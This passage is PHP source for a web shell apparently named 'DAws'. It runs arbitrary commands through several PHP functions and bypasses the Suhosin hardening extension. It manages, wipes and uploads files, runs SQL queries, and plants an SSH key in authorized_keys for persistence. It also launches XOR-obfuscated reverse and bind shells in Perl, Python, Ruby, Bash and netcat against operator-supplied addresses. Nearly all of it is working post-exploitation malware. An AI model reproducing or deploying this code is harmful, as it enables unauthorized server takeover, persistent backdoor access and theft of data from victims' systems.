			system($command);
		} else { //disabled by Suhosin
			bypass_suhosin("system", $command, null, null, null, null, False);
		}
		$return_value = ob_get_contents();
		ob_end_clean();
	} else if (disabled_php("passthru") == False) {
		ob_start();
		if (disabled_suhosin("passthru") == False) {
			passthru($command);
		} else {
			bypass_suhosin("passthru", $command, null, null, null, null, False);
		}
		$return_value = ob_get_contents();
		ob_end_clean();
	} else if (disabled_php("shell_exec") == False) {
		if (disabled_suhosin("shell_exec") == False) {
			$return_value = shell_exec($command);
		} else {
			$return_value = bypass_suhosin("shell_exec", $command);
		}
	} else if (disabled_php("exec") == False) {
		if (disabled_suhosin("exec") == False) {
			$return_value = exec($command);
		} else {
			$return_value = bypass_suhosin("exec", $command);
		}
	} else if (disabled_php("popen") == False) {
		if (disabled_suhosin("popen") == False) {
			$handle = popen($command, "r");
		} else {
			$handle = bypass_suhosin("popen", $command, "r");
		} 
		$return_value = fread($handle, 4096);
		pclose($handle);
	} else if (disabled_php("proc_open") == False) {
		if (disabled_suhosin("proc_open") == False) {
			$process = proc_open(
				$command,
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
		} else { //this gave me a headache so I will check it out later
			/*
			echo "proc_open-suhosin";
			$process = bypass_suhosin(
				"proc_open",
				$command,
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes);*/
		}

		$stdout = stream_get_contents($pipes[1]);
		$stderr = stream_get_contents($pipes[2]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);

		if ($stderr == "") {
			$return_value = $stdout;
		} else {
			$return_value = $stderr;
		}
	} else if ((isset($_SESSION["cgi"])) && ($_SESSION["cgi"] == True)) {
		$return_value = url_get_contents($_SESSION["cgi_url"]."?command=".base64encoding($command));
	} else if ((isset($_SESSION["shsh"])) && ($_SESSION["shsh"] == True)) {
		$return_value = shsh($command);
	} else if ((isset($_SESSION["shsh2"])) && ($_SESSION["shsh2"] == True)) {
		$return_value = shsh2($command);
	} else if ((isset($_SESSION["ssh"])) && ($_SESSION["ssh"] == True)) {
		$return_value = execute_ssh($command);
	} else {
		$return_value = "";
	}

	if ($software_check == True) {
		if (($return_value != "") && (strpos($return_value, "Could not find files") === False)) {
			return True;
		} else {
			return False;
		}
	} else {
		return $return_value;
	}
}

function execute_script($code, $location, $extension, $output_needed = False) {
	$filename = $_SESSION["daws_directory"]."/".time().".".$extension;
	write_to_file($filename, $code);

	$command = $location." ".$filename;

	//run the script in background and redirect its output to null
	if ($output_needed == False) { //we have to make sure that the user doesn't care about the output since we're redirecting it to null
		if ($_SESSION["windows"] == True) {
			$command = "START /B $command > null";
		} else if (execute_command("nohup", True)) { //use nohup if installed
			$command = "nohup $command > /dev/null 2>&1 &";
		}
	}

	return execute_command($command);
}

function file_get_contents_extended($filename, $is_url = False, $context = null) { //same thing was done for multiple other functions, the point is to bypass Suhosin using less code lol
	if (disabled_php("file_get_contents") == False) {
		if ((($is_url == True) && (ini_get("allow_url_fopen"))) || ($is_url == False)) {
			if (disabled_suhosin("file_get_contents") == False) {
				return file_get_contents($filename, False, $context);
			} else {
				return bypass_suhosin("file_get_contents", $filename, False, $context);
			}
		}
	} else {
		return False;
	}
}

function fopen_extended($filename, $type, $is_url=False, $context=null) {
	if (disabled_php("fopen") == False) {
		if ((($is_url == True) && (get_php_ini("allow_url_fopen"))) || ($is_url == False)) {
			if (disabled_suhosin("fopen") == False) {
				if ($context != null) { //it will cause an error if we don't do that, unlike file_get_contents
					return fopen($filename, $type, False, $context);
				} else {
					return fopen($filename, $type);
				}
			} else {
				if ($context != null) {
					return bypass_suhosin("fopen", $filename, $type, False, $context);
				} else {
					return bypass_suhosin("fopen", $filename, $type);
				}
			}
		}
	} else {
		return False;
	}
}

function file_put_contents_extended($file_name, $input) {
	if (disabled_php("file_put_contents") == False) {
		if (disabled_suhosin("file_put_contents") == False) {
			file_put_contents($file_name, $input);
		} else {
			bypass_suhosin("file_put_contents", $file_name, $input, null, null, null, False);
		}
	} else {
		return False;
	}

	return True;
}

function include_php($filename) {
	if (disabled_php("include") == False) {
		if (disabled_suhosin("include") == False) {
			include($filename);
		} else {
			bypass_suhosin("include", $filename, null, null, null, null, False);
		}
		unlink($filename);
	} else if (disabled_php("include_once") == False) {
		if (disabled_suhosin("include_once") == False) {
			include_once($filename);
		} else {
			bypass_suhosin("include_once", $filename, null, null, null, null, False);
		}
		unlink($filename);
	} else if (disabled_php("require") == False) {
		if (disabled_suhosin("require") == False) {
			require($filename);
		} else {
			bypass_suhosin("require", $filename, null, null, null, null, False);
		}
		unlink($filename);
	}
	else if (disabled_php("require_once") == False) {
		if (disabled_suhosin("require_once") == False) {
			require_once($filename);
		} else {
			bypass_suhosin("require_once", $filename, null, null, null, null, False);
		}
		unlink($filename);
	}
}

function execute_php($code, $output_needed) { //eval and its substitutes
	if (!get_php_ini("suhosin.executor.disable_eval")) { //we use eval since it's not blocked by suhosin
		eval($code);
	} else if ((disabled_php("include") == False) || (disabled_php("include_once") == False) || (disabled_php("require") == False) || (disabled_php("require_once") == False)) { //let the bodies hit the floor!
		$code = "<?php\n".$code."\n?>";
		$filename = $_SESSION["daws_directory"]."/".time().".php";
		write_to_file($filename, $code);

		include_php($filename);
	}
	else {
		$code = "<?php\n".$code."\n?>";

		echo execute_script($code, $_SESSION["php"], "php", $output_needed);
	}
}

function get_permissions($location) { //used to get the permissions of everything in the file manager
//this whole function was taken from http://php.net/manual/en/function.fileperms.php
	$perms = fileperms($location);

	if (($perms & 0xC000) == 0xC000)
		$info = 's';
	elseif (($perms & 0xA000) == 0xA000)
		$info = 'l';
	elseif (($perms & 0x8000) == 0x8000)
		$info = '-';
	elseif (($perms & 0x6000) == 0x6000)
		$info = 'b';
	elseif (($perms & 0x4000) == 0x4000)
		$info = 'd';
	elseif (($perms & 0x2000) == 0x2000)
		$info = 'c';
	elseif (($perms & 0x1000) == 0x1000)
		$info = 'p';
	else
		$info = 'u';

	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));

	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));

	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}

//ordering our file manager by alpha order and dirs come first.
function sortRows($data) {
	$size = count($data);

	for ($i = 0; $i < $size; ++$i) {
		$row_num = findSmallest($i, $size, $data);
		$tmp = $data[$row_num];
		$data[$row_num] = $data[$i];
		$data[$i] = $tmp;
	}

	return ($data);
}

function findSmallest($i, $end, $data) {
	$min['pos'] = $i;
	$min['value'] = $data[$i]['data'];
	$min['dir'] = $data[$i]['dir'];
	for (; $i < $end; ++$i) {
		if ($data[$i]['dir']) {
			if ($min['dir']) {
				if ($data[$i]['data'] < $min['value']) {
					$min['value'] = $data[$i]['data'];
					$min['dir'] = $data[$i]['dir'];
					$min['pos'] = $i;
				}
			} else {
				$min['value'] = $data[$i]['data'];
				$min['dir'] = $data[$i]['dir'];
				$min['pos'] = $i;
			}
		} else {
			if (!$min['dir'] && $data[$i]['data'] < $min['value']) {
				$min['value'] = $data[$i]['data'];
				$min['dir'] = $data[$i]['dir'];
				$min['pos'] = $i;
			}
		}
	}
	
	return ($min['pos']);
}

if (isset($_POST['download'])) { //downloads a file, what else could it be...
	$file = unxor_this($_POST['download']);
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename='.basename($file));
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
} else if (isset($_POST['command'])) { //executes a command
	$GLOBALS["command"] = str_replace("\n", "<br/>", execute_command(unxor_this($_POST["command"])));
} else if (isset($_POST['del'])) { //deletes a file or a directory
	$delete = unxor_this($_POST['del']);
	if (is_dir($delete)) {
		if ($_SESSION["windows"] == True) {
			execute_command("rmdir $delete /s");
		} else {
			execute_command("rm -r $delete");
		}
	} else {
		unlink($delete);
	}
} else if (isset($_POST['wipe'])) { //wipes a file
	//nothing badass really, we'll just replace all the old bytes with null bytes
	$wipe = unxor_this($_POST['wipe']);
	$file_size = filesize($wipe);

	$fp = fopen_extended($wipe, "rb+");
	if ($fp != False) {
		$fwrite = fwrite($fp, str_repeat("\0", $file_size), $file_size);
		fclose($fp);
	}
} else if (isset($_POST['edit'])) { //edits a file, I know, that's a badass comment.
	$content = unxor_this($_POST['edit']);
	$location = unxor_this($_POST['location']);

	write_to_file($location, $content);

	$_POST['dir'] = $_POST['location'];
} else if (isset($_POST['zip'])) { //zips a folder; multiple methods
	$location = unxor_this($_POST['zip']);

	if ((version_compare(PHP_VERSION, '5.2.0') >= 0) && (installed_php(null, "ZipArchive") == True)) { //best way
		$zip = new ZipArchive();
		$zip->open($_SESSION["daws_directory"]."/".basename($location).'.zip', ZipArchive::CREATE | ZipArchive::OVERWRITE);

		$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator($location),
			RecursiveIteratorIterator::LEAVES_ONLY
		);

		foreach ($files as $name => $file) {
			if (!$file->isDir()) {
				$filePath = $file->getRealPath();
				$relativePath = substr($filePath, strlen($location) + 1);

				$zip->addFile($filePath, $relativePath);
			}
		}

		$zip->close();
	} else { //system commands
		if ($_SESSION["windows"] == True) {
			if (strpos(execute_command("powershell.exe", True), "Windows PowerShell")) { //powershell gets the job done
				execute_command("powershell.exe -nologo -noprofile -command \"& { Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::CreateFromDirectory('$location', '".$location.".zip'); }\"");
			} else { //vbs script it is
				$code = 'ArchiveFolder "'.$_SESSION["daws_directory"]."/".basename($location).'.zip", "' . $location . '"'.unxor_this("NxoWQzECBQEFEwEpGw8UFRRJRB8NHzIKHBVKSR8jCwMQBgJZbGNMRURPIwoEGEYqHgAFGxEsEhoDChhNRjwXERkAEgACAkopHQ8VIx8aGAAJIBYJFRMSS0VvRE9UQ1BQRkkWDBQpHQ8VUFtJQiIBGzUBAx8KHBgANA4ACz4RCwxEHw0fMgocFU9jTEVET1RDUFAVLwMJAAoGQ01QSC4JESUNBwwcBRIMPAQQBzoCHRVOGioKCAsREVl6bElMRURPVENQJw8dBEVKLAYGEQQDPQkdECkdDxVYHAAcIw0DEU9QJBQcCUxuT1RDUFBGSUxFRE9UTScCDx0JRScHBktIQE9JSkUnBwZLR0VPSUpFJwcGS0VZRk9MJgwdXFVZUEBJPxEWBhoEWEFeRUwGDB1cU1lZbElMRURPVENQNQgNTDINGxxpUFBGSSkLAE8jCgQYbGNMRURPIwoEGEYqHgAFGxEsEhoDChhNRjwcBhwcSCgcFQgGFwIEGQkHTkxuT1RDUFBGSUxLKg4ZBiMABwoJTR4GBCUZHANAQiYLHw0rFQIDSUIrBQIRMAARBQxEFiIAGAcVAk9HJREBAgdpelBGSUxFRE9UJx9QMwcYDAhPWi0RHQM6HAQHClwZGQAgAAAATUE9FxUdFUcvChEBAENNUDljTEVET1RDUFBGSUxFRE9UQ1BeKAgBADcfFQAVWBUvAwkACgZKXjkSDAEWSiwbFh4EbElMRURPVENQUEZJTDI3DAYKAARIOgAAAR9UUkBAVklmRURPVENQUEYlAwoUZVRDUFAjBwhFMwYAC3p6IwcIRTcaFg==", "dotcppfile");
				write_to_file($_SESSION["daws_directory"]."/zip_folder.vbs", $code);
				execute_command("cscript //nologo ".$_SESSION["daws_directory"]."/zip_folder.vbs");
			}
		} else {
			execute_command("zip -r ".$_SESSION["daws_directory"]."/".basename($location).".zip $location");
		}
	}
} else if (isset($_POST['new_name'])) { //renames a file
	$old_name = unxor_this($_POST['old_name']);
	$new_name = unxor_this($_POST['dir'])."/".unxor_this($_POST['new_name']);

	rename($old_name, $new_name);
} else if (isset($_POST['new_chmod'])) { //chmods a file
	$file_name = unxor_this($_POST['file_name']);
	
	@chmod($file_name, octdec(intval(unxor_this($_POST['new_chmod'])))); //we try to chmod it with error supression
} else if (isset($_FILES["file_upload"])) { //uploads multiple files
	$file_ary = array();
    $file_count = count($_FILES["file_upload"]["name"]);
    $file_keys = array_keys($_FILES["file_upload"]);

	for ($i=0; $i<$file_count; $i++) {
		foreach ($file_keys as $key) {
			$file_ary[$i][$key] = $_FILES["file_upload"][$key][$i];
		}
	}

	foreach ($file_ary as $file) {
		$target_file = $_SESSION["daws_directory"]."/".basename($file["name"]);
		move_uploaded_file($file["tmp_name"], $target_file);
	}
} else if (isset($_POST["link_download"])) { //downloads a file from a direct link
	$link = unxor_this($_POST["link_download"]);
	$location = $_SESSION["daws_directory"]."/".basename($link);

	$output = url_get_contents($link);
	write_to_file($location, $output);
} else if (isset($_POST["mkfile"])) { //creates a file
	$location = unxor_this($_POST["dir"])."/".unxor_this($_POST["mkfile"]);

	write_to_file($location, "");
} else if (isset($_POST["mkdir"])) { //creates a directory
	$location = unxor_this($_POST["dir"])."/".unxor_this($_POST["mkdir"]);

	mkdir($location);
} else if (isset($_POST["sql_user"])) { //this is basically a sql connection test
	$_SESSION["sql_host"] = unxor_this($_POST["sql_host"]);
	$_SESSION["sql_user"] = unxor_this($_POST["sql_user"]);
	$_SESSION["sql_pass"] = unxor_this($_POST["sql_pass"]);
	$_SESSION["sql_database"]  = unxor_this($_POST["sql_database"]);

	if (installed_php(null, "PDO")) { //used PDO if it's installed
		try { //we will use this try to catch PDO errors with an exception
			$conn = new PDO("mysql:host=".$_SESSION["sql_host"].";dbname=".$_SESSION["sql_database"], $_SESSION["sql_user"], $_SESSION["sql_pass"]);
			
			$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); //set pdo error mode to exception

			$conn = null;
			
			$_SESSION["mysqli"] = True; //success
		} catch(PDOException $e) {
			$_SESSION["mysqli"] = False;
		}
	} else {
		$link = @mysqli_connect($_SESSION["sql_host"], $_SESSION["sql_user"], $_SESSION["sql_pass"], $_SESSION["sql_database"]);

		if (!mysqli_connect_errno()) {
			$_SESSION["mysqli"] = True; //success
		} else {
			$_SESSION["mysqli"] = False;
		}

		@mysqli_close($link);
	}
} else if (isset($_POST["sql_execute"])) {
	$sql_query = unxor_this($_POST["sql_execute"]);

	if (installed_php(null, "PDO")) { //used PDO if it's installed
		try { //we will use this try to catch PDO errors with an exception
			//reconnecting each time because persistent connections were added in php 5.3 so we simply can't risk it...
			$conn = new PDO("mysql:host=".$_SESSION["sql_host"].";dbname=".$_SESSION["sql_database"], $_SESSION["sql_user"], $_SESSION["sql_pass"]);
			
			$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); //set pdo error mode to exception

			$sth = $conn->prepare($sql_query);
			$sth->execute();

			$result = $sth->fetchAll();

			$return_value = "";
			foreach ($result as $row) {
				for ($i = 0; $i < sizeof($row)/2; $i++) {
					$return_value .= htmlspecialchars($row[$i])." ";
				}
				$return_value .= "\n";
			}

			$conn = null;
		} catch(PDOException $e) {
			$return_value = $e->getMessage();
		}
	} else {
		$link = mysqli_connect($_SESSION["sql_host"], $_SESSION["sql_user"], $_SESSION["sql_pass"], $_SESSION["sql_database"]);

		if ($result = mysqli_query($link, $sql_query)) {
			$col_cnt = mysqli_field_count($link);
			if ($col_cnt != 0) {
				$return_value = "";
				while ($row = mysqli_fetch_row($result)) {
					for ($i = 0; $i < $col_cnt; $i++) {
						$return_value .= htmlspecialchars($row[$i])." ";
					}
					$return_value .= "\n";
				}
				mysqli_free_result($result);
			} else {
				$return_value = "";
			}
		} else {
			$return_value = mysqli_error($link);
		}

		mysqli_close($link);
	}
	
	if (isset($_POST["save_output"])) {
		write_to_file($_SESSION["daws_directory"]."/sql_".time(), $return_value);
	} else {
		$GLOBALS["sql_output"] = $return_value;
	}
} else if ((isset($_POST["ssh_user"])) && file_exists($_SESSION["daws_directory"]."/AES.php") && file_exists($_SESSION["daws_directory"]."/Base.php") && file_exists($_SESSION["daws_directory"]."/BigInteger.php") && file_exists($_SESSION["daws_directory"]."/Blowfish.php") && file_exists($_SESSION["daws_directory"]."/DES.php") && file_exists($_SESSION["daws_directory"]."/Hash.php") && file_exists($_SESSION["daws_directory"]."/openssl.cnf") && file_exists($_SESSION["daws_directory"]."/Random.php") && file_exists($_SESSION["daws_directory"]."/RC2.php") && file_exists($_SESSION["daws_directory"]."/RC4.php") && file_exists($_SESSION["daws_directory"]."/Rijndael.php") && file_exists($_SESSION["daws_directory"]."/RSA.php") && file_exists($_SESSION["daws_directory"]."/SSH2.php") && file_exists($_SESSION["daws_directory"]."/TripleDES.php") && file_exists($_SESSION["daws_directory"]."/Twofish.php")) {
	//finding the right ssh port, the home directory and the user automatically is somehow stupid.
	//it will require a lot of work and a lot of code that will force DAws to use multiple functions that could be
	//blocked by security systems. Lets not forget that even if all of this succeeded, the collected information
	//could be wrong.
	//if these values were well provided by the user then this method will have a higher success rate.
	$_SESSION["home_dir"] = unxor_this($_POST["home_dir"]); //can be found by using DAws's file manager
	$_SESSION["ssh_port"] = unxor_this($_POST["ssh_port"]); //can be found by simple port scan
	$_SESSION["ssh_user"] = unxor_this($_POST["ssh_user"]); //can be found by using DAws's file manager as well

	//creating the key
	include_php($_SESSION["daws_directory"]."/RSA.php"); //this should have been uploaded by the user himself
	$rsa = new Crypt_RSA();
	$rsa->setPublicKeyFormat(CRYPT_RSA_PUBLIC_FORMAT_OPENSSH); //formatted for OpenSSH
	$key = $rsa->createKey(1024);
	$rsa->loadKey($key["privatekey"]);

	//we have to serialize the rsa object since we want to store it in a session variable for later use
	$_SESSION["ssh_rsa"] = serialize($rsa);

	if ($_SESSION["windows"] == True) //http://osses.info/openssh.htm (FreeSSHD) will work on it later
	{
	} else { //http://sshkeychain.sourceforge.net/mirrors/SSH-with-Keys-HOWTO/SSH-with-Keys-HOWTO-4.html (4.4)
		$ssh_dir = $_SESSION["home_dir"]."/.ssh";
		//authorized_keys not authorized_keys2 because in the new release authorized_keys2 has been removed
		//http://marc.info/?l=openssh-unix-dev&m=100508718416162&w=2
		$authorized_keys = $_SESSION["home_dir"]."/.ssh/authorized_keys";

		if (!file_exists($ssh_dir)) { //.ssh doens't exist
			if (is_writable($_SESSION["home_dir"])) { //we can create the .ssh folder
				mkdir($ssh_dir);
				chmod($ssh_dir, 0700);
				$ssh_dir_exists = True;
			} else { //we can't create the .ssh folder
				$ssh_dir_exists = False;
			}
		} else { //.ssh already exists
			$ssh_dir_exists = True;
		}

		if ($ssh_dir_exists == True) { //we got a .ssh directory
			if (!file_exists($authorized_keys)) { //authorized_keys doens't exist
				if (is_writable($ssh_dir)) {
					write_to_file($authorized_keys, $key["publickey"]);
					chmod($authorized_keys, 0600);

					$everything_ready = True;
				} else {
					$everything_ready = False;
				}
			} else { //authorized_keys already exists
				@chmod($authorized_keys, 0600); //we try to chmod it first with error supression

				if ((is_readable($authorized_keys)) && (is_writable($authorized_keys))) {
					//not appending with fopen since fopen could be disabled, write_to_file will use multiple other functions.
					$output = file_get_contents_extended($authorized_keys);
					write_to_file($authorized_keys, $output.$key["publickey"]);

					$everything_ready = True;
				} else {
					$everything_ready = False;
				}
			}
		} else {
			$everything_ready = False;
		}

		if ($everything_ready == True) {
			if (execute_ssh("echo dotcppfile") == "dotcppfile") {
				$_SESSION["ssh"] = True;
			} else {
				$_SESSION["ssh"] = False;
			}
		} else {
			$_SESSION["ssh"] = False;
		}
	}
} else if (isset($_POST["reverse_ip"])) { //reverse shells
	$rs_lang = unxor_this($_POST["rs_lang"]);
	
	if ($rs_lang == "Perl") {
		$shell = "ERwRQyMfBQIJEV9lfkcZAFtLXVdTQURNQF5XS1dvQB8bEQRNUl1YUV9lfhAfEw0MGE03Q1QzNi8vJykxSE8nLDM7OTo4NyEuOU9QFwMdHBcLGxsBCR4HBAlNRhsXE1JZT1Jmbw0JXAAfHggMDxFMPFhDAx8FAg0BAB0rCh5YQhkDFxBDVAoeFRI2DRELAVxHGQBPQEVMbhR+ah8AAwdENjArPS1cUlhPP0dNVH5qHwADB0Q2MCs7NiRcRFdKNkZGT2l5HxYMAk03OzAmIiJKS1JDN01dWHp5AxEJBkxNWwEZHkkaBEVJBlZKS3obUg==";
		$location = $_SESSION["perl"];
		$extension = "pl";
	} else if ($rs_lang == "Python") {
		$shell = "DQIEDAIERhoDBg8KAE9QAxMLHBcLDBEQA1xGBh9vbgYEXlJBVF5CVUpfWlJSehYGHhFZW0BXRHpsGkxYRBwbABsVEkcfCgcEERdYAwkKBwAQQTUlLzkoLDhJRBwbABsVEkc/KickKzAkIiMoIUxuHFoAHx4IDA8RTEcdE1xQFgYeEU1GfmkfA0gNGRVWRwdNFhkKDAIKTEZYU1l6CRpCAREfRksDXgAAAAAKAFxKXEFPYwMWSgsBE0JYFUcKDAgKGgxYWUpbRW9uH1ReUAMTCxwXCwwREANeBQgACUw0VkwSGQhGHw1GQ1RBXRlENEU=";
		$location = $_SESSION["python"];
		$extension = "py";
	} else if ($rs_lang == "Ruby") {
		$shell = "FgoFFhkCA0lLFgsMHwYEV2xjBRVZTUVRR15WR1xLVU1+Ex8CElRYUVBbfmkWUFtJOCY0PBsAGxUSRwMVAQFcCgBcRhkDFxBGWhcfLw9jCR0BDFQQAAIPBxgDTE1bARkeSRoERUkGVF9WVQJJUkNBC1RRTlZDDU5JAkMSTxZZ";

		$location = $_SESSION["ruby"];
		$extension = "rb";
	} else if ($rs_lang == "Bash") {
		$shell = "DR9JQUFCUUdcS1RBRUF6AAkbGFhQW0BXenoDEQkGRFpIXV8UAx9DEQcfW0cZAElNHAoWG34AEQRGVUpQRBNUFBgZCgxMFwEOEEMcGQgMV0UAAFRHHBkIDExXWklBQ05WU1JMAQsBEQ==";

		$location = "bash";
		$extension = "sh";
	}

	$ip = unxor_this($_POST["reverse_ip"]);
	$port = unxor_this($_POST["reverse_port"]);

	$shell = unxor_this($shell, "dotcppfile");
	$shell = str_replace("ip=\"127.0.0.1\"", "ip=\"$ip\"", $shell);
	$shell = str_replace("port=4444", "port=$port", $shell);

	if (isset($_POST["background"])) {
		execute_script($shell, $location, $extension);
	} else {
		execute_script($shell, $location, $extension, True);
	}
} else if (isset($_POST["bind_port"])) { //bind shells
	$bs_lang = unxor_this($_POST["bs_lang"]);
	
	if ($bs_lang == "Perl") {
		$shell = "ERwRQyMfBQIJEV9lfkcAHxQdUVFQW0BYenoVBg8OARtcMDUiMCw+SUQuMjw5PiM9QEU3IDcoLyMyOykkKUNUBBUEFhsDEQsNDQ0RHQNBSxEHH1NKWUtsYwUDTA0dDRRYNSw+MyE9WEMDHwUCDQEAHSsKHlhCGQMXEENUCh4VEjYNEQsBXEFBQlFHXEtUQUVBWVlPQGYebmYYCgMEAwdENiE9IiYiXFdZRV5EZX0CExMDGRhNJyM9Jj4kSjopNzIqJkpLemxgAxUBAVwwJDQvJ0BHWkk3Lzk1KD1OTF9lfQwAFQhBPzEgICE3XFJYTy8pLSo6N1JZXWNlChQKGksjJCIsPjdITUpFMzwvLCIxRkZPaXkVHgwPTUZAFgoeXxUBTEgNTV1Yeg0=";
		$location = $_SESSION["perl"];
		$extension = "pl";
	} else if ($bs_lang == "Python") {
		$shell = "DQIEDAIERhoDBg8KAE9QAxMLHBcLDBEQA1xGBh9vbh8bEQRNUl1YUW5lB0NNUBUGDw4BG1oQHxMNDBhNFwAXCBUESCgqOi0hMTdcUBUGDw4BG1owPzMtNj8xNio1Lll6FUcODAoLXEtSQVReQlVKX1pSUlxGGQMXEEZdaQNeCgAfEQEBXFZZemwKAwsKQ1QCFBQUSVFFF0EVABMVFh1ETG5lGxBeFBMZXk0HABoNXhYPBQkLC0ddT0BZbAYfSwAaBFFYEwkHAksCBhgGHh9OQEBUTWUbEF4UExleTQcAGg1eFg8FCQsLR11PQllsYxxFWU8HFhIAFAYPABccWgARHApBN0dLDR0NXwMOS0BFRkIdQS1Z";
		$location = $_SESSION["python"];
		$extension = "py";
	} else if ($bs_lang == "Ruby") {
		$shell = "FgoFFhkCA0lLFgsMHwYEV2xjHAoWG0lXRERSY2YWAR0CBgJQW0k4JjQ8EREGFRRHAgATTwQMAgRsCgAMAQEAQ01QFQweEwEdWgITEwMZGG9uCgwGE1AVGR4MChsSS1JfBAACShcHVE4ZUFpPSQFEUVJGFFBUV0pAAE1YABwZAwcYSQcDHQYeBEoKAAwBAQBK";

		$location = $_SESSION["ruby"];
		$extension = "rb";
	} else if ($bs_lang == "Netcat") {
		$shell = "FAAGF01EUl1Yb24BF0NdHBAZTEEUAAYXUF0DSUMHDQFbEBg=";

		$location = "bash";
		$extension = "sh";
	}

	$port = unxor_this($_POST["bind_port"]);

	$shell = unxor_this($shell, "dotcppfile");
	$shell = str_replace("port=4444", "port=$port", $shell);

	if (isset($_POST["background"])) {
		execute_script($shell, $location, $extension);
	} else {
		execute_script($shell, $location, $extension, True);
	}
}

if (isset($_POST["dir"])) { //gets the proper value of 'dir'
	$dir = unxor_this($_POST["dir"]);
	$size = strlen($dir);

	if ($_SESSION["windows"] == True) {
		$dir = str_replace('\\', '/', $dir); //that's better for Windows
	}

	while ($dir[$size - 1] == '/') {
		$dir = substr($dir, 0, $size - 1);
		$size = strlen($dir);
	}
} else {
	$dir = getcwd();
}

//html, css and js code
echo "
<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN'
'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en' lang='en'>
<head>
<meta http-equiv='content-type' content='text/html; charset=utf-8'/>
<title>DAws</title>
<style type=\"text/css\">
	* {
		font-size: 12px;
	}
	html {
		overflow-y: scroll;
	}
	body {
		font-family: Verdana, Geneva, sans-serif;
		line-height: 1.4;
		background: #242625;
		color: #F9F7ED;
		margin: 0;
		padding: 0;
	}
	textarea {
		width: 80%;
		height: 150px;
	}
	a {
		color: #B3E1EF;
		text-decoration: none;
	}
	h1 a {
		font-weight: 100;
		font-size: 28px;
		color: #B3E1EF;
	}
	h3 {
		margin-top: 3%;
		margin-bottom: 1%;
	}
	h3 a {
		font-size: 18px;
	}
	caption, caption * {
		text-decoration: none;
		font-size:16px;
		color: #B3E1EF;
		margin-bottom: 5px;
	}
	.flat-table {
		text-align: center;
		background: #3F3F3F;
		margin-top: 1%;
		margin-bottom: 1%;
		border-collapse: collapse;
		border: 1px solid black;
		width: 100%;
	}
	.flat-table th {
		background: #2C2F2D;
		height: 30px;
		line-height: 30px;
		font-weight: 600;
		font-size: 14px;
		padding-left: 10px;
		color: #F9F7ED;
		border: 1px solid black;
	}
	.flat-table td {
		height: 30px;
		border: 1px solid black;
	}
	.flat-table-2 {
		text-align: center;
		background: #3F3F3F;
		margin-top: 10px;
		margin-bottom: 10px;
		width: 505px;
		height: 335px;
	}
	.flat-table tr:hover{
		background: rgba(0,0,0,0.19);
	}
	.danger {
		color: red;
	}
	.success {
		color: green;
	}
	.a_button {
		border: none;
		background: none;
		padding: 0;
		color: #B3E1EF;
	}
	.a_button:hover {
		text-decoration: underline;
		cursor: pointer;
	}
	.left {
		position: fixed;
		width: 18%;
		height: 95%;
		margin: 1%;
		top: 0;
		left: 0;
		overflow-y: auto;
	}
	.right {
		position: fixed;
		width: 18%;
		height: 95%;
		margin: 1%;
		top: 0;
		right: 0;
		overflow-y: auto;
	}
	.center {
		width: 60%;
		margin-left: 20%;
	}
</style>

<script>
function xor_str(to_xor) { //javascript encryption used for our live inputs.
	var key = \"".$_SESSION['key']."\";
	var the_res = \"\";
	for(i=0; i<to_xor.length;) {
		for(j=0; (j<key.length && i<to_xor.length); ++j,++i) {
			the_res+=String.fromCharCode(to_xor.charCodeAt(i)^key.charCodeAt(j));
		}
	}
	return btoa(the_res);
}

function xorencr(input) { //gets our inputs as an array and uses 'xor_str` to encrypt them.
	var arrayLength = input.length;
	var field = String();
	for (var i = 0; i < arrayLength; i++) {
		field = document.getElementById(input[i]);
		field.value = xor_str(field.value);
	}
}

function show_div(div_name) { //used by the 'rename' form in the file manager to show/hide the div when clicked.
	if (document.getElementById(div_name).style.display == \"block\") {
    		document.getElementById(div_name).style.display = \"none\";
	} else {
    		document.getElementById(div_name).style.display = \"block\";
	}
}

</script>
</head>

<body>

<div class='left' id='left'>
<table class='flat-table' style='width:100%;height:100%;'>
	<caption>Various information</caption>
	<tr>
		<th style='width:40%;'>Info</th>
		<th>Value</th>
	</tr>
	<tr>
		<td>Version</td>
		<td>".php_uname()."</td>
	</tr>
	<tr>
		<td>Server's IP</td>";
	if ($_SERVER['SERVER_ADDR'] != null) {
		echo "<td>".$_SERVER['SERVER_ADDR']."</td>";
	} else { //for IIS
		echo "<td>".$_SERVER['HTTP_HOST']."</td>";
	}
	echo "</tr>
	<tr>
		<td>Process Owner</td>
		<td>".$_SESSION["process_owner"]."</td>
	</tr>";

	$group_name = "";
	if (installed_php("posix_geteuid")) { //Linux
		$group_name = posix_getgrgid(posix_geteuid());
		$group_name = $group_name["name"];
	}
	echo "
	<tr>
		<td>Group Name</td>
		<td>".$group_name."</td>
	</tr>";
	
	echo "
	<tr>
		<td>Script Owner</td>
		<td>".get_current_user()."</td>
	</tr>
	<tr>
		<td>Disk Total Space</td>
		<td>".floor((disk_total_space(realpath("/")))/(1073741824))." GB</td>
	</tr>";

